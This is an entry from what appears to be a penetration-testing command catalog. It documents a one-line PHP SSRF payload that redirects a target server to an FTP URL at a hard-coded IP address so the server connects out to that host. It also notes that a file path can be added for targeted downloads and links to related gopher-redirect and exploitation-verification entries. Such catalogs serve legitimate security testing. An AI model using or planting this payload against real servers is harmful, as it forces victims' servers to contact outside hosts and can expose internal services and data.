---
id: cmd-php-ftp-redirect
data: '<?php header(''Location: ftp://192.166.218.53/''); ?>'
tags:
  - ssrf
  - redirect
  - ftp
type: command
output: null
executor: php
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:53:38.072Z'
verified: false
validated: true
submitted: true
---
# php-redirect-to-ftp

## Command

```php
<?php header('Location: ftp://192.166.218.53/'); ?>
```

## Description

PHP redirect to an FTP URL, causing the target server to attempt an FTP connection, useful for logging anonymous logins or file listings in SSRF scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Location | FTP URL (e.g., ftp://IP/) | Yes |

## Examples

### Basic Usage

```php
<?php header('Location: ftp://192.166.218.53/'); ?>
```

### Advanced Usage

Include path: ftp://IP/file.txt for targeted downloads.

## Expected Output

302 redirect leading to FTP client initiation; logs show connection attempts.

## Related

- [[commands/php-redirect-to-gopher]]
- [[procedures/Verify-SSRF-Exploitation-in-Logs]]
